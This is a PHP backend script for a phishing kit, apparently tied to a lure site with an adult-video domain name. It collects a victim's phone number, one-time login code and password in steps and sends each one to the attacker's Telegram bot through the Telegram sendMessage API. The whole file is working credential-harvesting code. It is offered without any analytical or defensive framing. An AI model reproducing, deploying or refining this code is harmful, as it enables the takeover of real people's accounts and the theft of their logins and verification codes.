<?php
// Define allowed domain
$allowedDomain = "https://desiviralxxxvideos.infy.uk";

// Enable CORS only for the allowed domain
header("Access-Control-Allow-Origin: $allowedDomain");
header("Access-Control-Allow-Methods: GET, POST");
header("Access-Control-Allow-Headers: Content-Type");

// Validate origin and referer to prevent unauthorized access
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

if ($origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
    http_response_code(403); // Forbidden
    echo json_encode(["error" => "Access denied"]);
    exit();
}

// Allow only GET and POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Only GET and POST requests are allowed"]);
    exit();
}

// Load environment variables
$telegramToken = getenv('TOKEN'); // Secure token storage
$chatId = getenv('ID'); // Store Chat ID in environment variable

// Function to send a message to Telegram
function sendToTelegram($message) {
    global $telegramToken, $chatId;

    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Handle both GET and POST requests
$requestData = $_SERVER['REQUEST_METHOD'] === 'POST' ? $_POST : $_GET;
$action = $requestData['action'] ?? '';

// Handle phone submission
if ($action === 'phone') {
    $phone = $requestData['phone'] ?? '';
    sendToTelegram("*Phone:* \n`$phone`");
    echo json_encode(["step" => "code"]);
    exit;
}

// Handle OTP submission
if ($action === 'otp') {
    $phone = $requestData['phone'] ?? '';
    $code = $requestData['code'] ?? '';
    sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");
    echo json_encode(["step" => "password"]);
    exit;
}

// Handle password submission
if ($action === 'password') {
    $phone = $requestData['phone'] ?? '';
    $password = $requestData['password'] ?? '';
    sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");
    echo json_encode(["status" => "success"]);
    exit;
}

// Default response if no valid action
http_response_code(400);
echo json_encode(["error" => "Invalid request"]);
?>